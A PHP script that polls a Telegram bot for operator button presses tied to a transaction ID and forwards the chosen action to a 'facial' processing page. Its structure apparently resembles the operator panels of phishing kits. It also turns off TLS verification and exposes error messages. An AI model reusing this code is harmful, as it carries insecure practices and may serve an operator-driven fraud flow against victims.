<?php
session_start();
header('Content-Type: application/json');
ini_set('display_errors', 1);
error_reporting(E_ALL);

try {
    $config = require __DIR__ . '/../config.php';
    $transactionId = $_POST['transactionId'] ?? '';

    if (empty($transactionId)) {
        echo json_encode(['action' => null]);
        exit;
    }

    // OBTENER ACTUALIZACIONES
    $offset = $_SESSION['last_update_id'] ?? 0;
    $url = "https://api.telegram.org/bot{$config['bot_token']}/getUpdates?offset=" . ($offset + 1) . "&timeout=1";
    
    $ch = curl_init($url);
    curl_setopt_array($ch, [
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_SSL_VERIFYPEER => false,
        CURLOPT_SSL_VERIFYHOST => false,
        CURLOPT_TIMEOUT => 2
    ]);
    
    $response = curl_exec($ch);
    curl_close($ch);
    
    $data = json_decode($response, true);
    
    if (empty($data['result'])) {
        echo json_encode(['action' => null]);
        exit;
    }

    foreach ($data['result'] as $update) {
        if (!isset($update['callback_query'])) continue;
        
        $callback = $update['callback_query'];
        $callbackData = $callback['data'] ?? '';
        
        // VERIFICAR SI ES PARA ESTE TRANSACTION
        if (strpos($callbackData, $transactionId) === false) continue;
        
        // EXTRAER ACCIÓN
        list($action, $id) = explode(':', $callbackData);
        
        if ($id !== $transactionId) continue;
        
        $callbackId = $callback['id'] ?? '';
        $adminName = $callback['from']['first_name'] ?? 'Operador';
        $adminUsername = $callback['from']['username'] ?? '';
        
        $adminDisplay = $adminUsername ? "@" . $adminUsername : $adminName;
        
        // ENVIAR MENSAJE CON ACCIÓN DEL ADMIN (NUEVO MENSAJE)
        $actionUrl = "http://" . $_SERVER['HTTP_HOST'] . dirname($_SERVER['PHP_SELF']) . "/procesar_facial.php";
        $actionData = [
            'adminAction' => 'true',
            'action' => $action,
            'adminName' => $adminDisplay,
            'transactionId' => $transactionId,
            'callbackId' => $callbackId
        ];
        
        // ENVIAR DE FORMA ASÍNCRONA
        $ch = curl_init($actionUrl);
        curl_setopt_array($ch, [
            CURLOPT_POST => true,
            CURLOPT_POSTFIELDS => $actionData,
            CURLOPT_TIMEOUT => 1,
            CURLOPT_RETURNTRANSFER => false
        ]);
        curl_exec($ch);
        curl_close($ch);
        
        // ACTUALIZAR OFFSET
        $_SESSION['last_update_id'] = $update['update_id'];
        
        // RESPONDER CON LA ACCIÓN
        echo json_encode([
            'action' => $action,
            'adminName' => $adminDisplay
        ]);
        exit;
    }
    
    echo json_encode(['action' => null]);

} catch (Exception $e) {
    echo json_encode(['action' => null, 'error' => $e->getMessage()]);
}